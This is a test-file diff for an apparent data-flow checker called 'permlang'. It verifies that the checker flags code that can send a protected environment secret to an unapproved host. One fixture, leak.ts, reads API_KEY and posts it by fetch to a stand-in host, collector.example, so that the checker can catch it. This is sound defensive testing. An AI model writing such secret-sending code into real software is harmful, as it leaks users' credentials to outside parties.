@@ -106,6 +106,32 @@ describe("configuration errors", () => {
   });
 });
 
+describe("data-flow rules", () => {
+  it("fails a function that can send a protected secret to another host", () => {
+    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)", to: ["net(api.example.com)"] }] }));
+    // This temporary repository has no node_modules: just enough of @types/node for process.env.
+    writeFileSync(
+      path.join(dir, "my lib", "node.d.ts"),
+      "declare namespace NodeJS { interface ProcessEnv { [key: string]: string | undefined } }\ndeclare var process: { env: NodeJS.ProcessEnv };\n",
+    );
+    writeFileSync(
+      path.join(dir, "my lib", "leak.ts"),
+      "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
+    );
+    const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
+    expect(code).toBe(0);
+    expect(out).toContain("my lib/leak.ts:3:9 warning PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
+    expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
+  });
+
+  it("rejects a malformed rule", () => {
+    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)" }] }));
+    const { code, out } = permlang("check", "my lib", "--no-lock");
+    expect(code).toBe(2);
+    expect(out).toContain('flows[0]: "to" must be a list of capabilities');
+  });
+});
+
 describe("tools given to AI models", () => {
   it("warns about a tool a model can point anywhere, and marks its new access in the comment", () => {
     writeFileSync(path.join(dir, "my lib", "ai.d.ts"), 'declare module "ai" { export function tool<T>(definition: T): T; }\n');
